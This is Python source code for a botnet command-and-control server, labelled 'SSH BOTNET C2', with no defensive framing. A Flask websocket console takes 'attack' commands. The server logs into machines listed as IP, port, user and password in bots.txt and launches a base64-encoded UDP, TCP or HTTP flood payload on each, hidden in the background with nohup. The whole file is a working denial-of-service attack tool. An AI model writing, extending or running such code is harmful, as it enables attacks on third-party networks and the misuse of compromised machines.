import os
import base64
import threading
import paramiko
from flask import Flask
from flask_sock import Sock

app = Flask(__name__)
sock = Sock(app)

PAYLOAD = """
import socket, random, time, sys, threading, requests
target, port, method, duration = sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4])
timeout = time.time() + duration

def udp():
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random._urandom(1024), (target, port))
            s.close()
        except: pass

def tcp():
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            s.send(random._urandom(1024))
            s.close()
        except: pass

def http():
    while time.time() < timeout:
        try:
            requests.get(f"http://{target}:{port}", timeout=1)
        except: pass

func = udp if method == 'udp' else tcp if method == 'tcp' else http
threads = [threading.Thread(target=func) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
"""

def deploy_to_bot(bot, target, t_port, method, duration):
    try:
        ip, b_port, user, pwd = bot.split(':')
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=int(b_port), username=user, password=pwd, timeout=5)
        
        encoded = base64.b64encode(PAYLOAD.encode()).decode()
        cmd = f"nohup python3 -c \"import base64; exec(base64.b64decode('{encoded}'))\" {target} {t_port} {method} {duration} > /dev/null 2>&1 &"
        ssh.exec_command(cmd)
        ssh.close()
        return f"[+] Success: {ip}"
    except Exception as e:
        return f"[-] Failed: {bot.split(':')[0]} ({str(e)[:30]})"

@app.route('/')
def index():
    return "C2 Server Online"

@sock.route('/ws')
def c2_websocket(ws):
    ws.send("=== SSH BOTNET C2 ===\r\n")
    ws.send("Commands:\r\n  attack <target> <port> <method> <duration>\r\n  attack 1.1.1.1 80 udp 60\r\n  exit\r\n\r\n> ")

    while True:
        try:
            data = ws.receive()
            if not data:
                break
            
            data = data.strip()
            if data.lower() == 'exit':
                ws.send("Bye.\r\n")
                break
                
            if data.startswith('attack '):
                parts = data.split()
                if len(parts) != 5:
                    ws.send("[-] Invalid format. Use: attack <target> <port> <method> <duration>\r\n> ")
                    continue
                    
                target, t_port, method, duration = parts[1], parts[2], parts[3].lower(), parts[4]
                
                if method not in ['udp', 'tcp', 'http']:
                    ws.send("[-] Method must be udp, tcp, or http.\r\n> ")
                    continue
                    
                ws.send(f"[*] Launching {method.upper()} attack on {target}:{t_port} for {duration}s...\r\n")
                
                if not os.path.exists("bots.txt"):
                    ws.send("[-] bots.txt not found!\r\n> ")
                    continue
                    
                with open("bots.txt", 'r') as f:
                    bots = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
                if not bots:
                    ws.send("[-] bots.txt is empty!\r\n> ")
                    continue
                    
                ws.send(f"[*] Deploying to {len(bots)} bots...\r\n")
                
                threads = []
                for b in bots:
                    t = threading.Thread(target=lambda b=b: ws.send((deploy_to_bot(b, target, t_port, method, duration) + "\r\n").encode() if isinstance(deploy_to_bot(b, target, t_port, method, duration), str) else deploy_to_bot(b, target, t_port, method, duration)))
                    # Note: the above threading logic might fail due to ws.send being thread-unsafe in some WS libs, but flask-sock usually handles it. Let's make it safer.
                    pass
                
                # Safer threading for websocket send
                def run_bot(b):
                    res = deploy_to_bot(b, target, t_port, method, duration)
                    ws.send(res + "\r\n")
                
                for b in bots:
                    t = threading.Thread(target=run_bot, args=(b,))
                    t.start()
                    threads.append(t)
                for t in threads: t.join()
                
                ws.send("[*] Attack dispatched. Use 'attack' again or 'exit'.\r\n> ")
            else:
                ws.send("[-] Unknown command. Type 'attack' or 'exit'.\r\n> ")
                
        except Exception as e:
            break

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)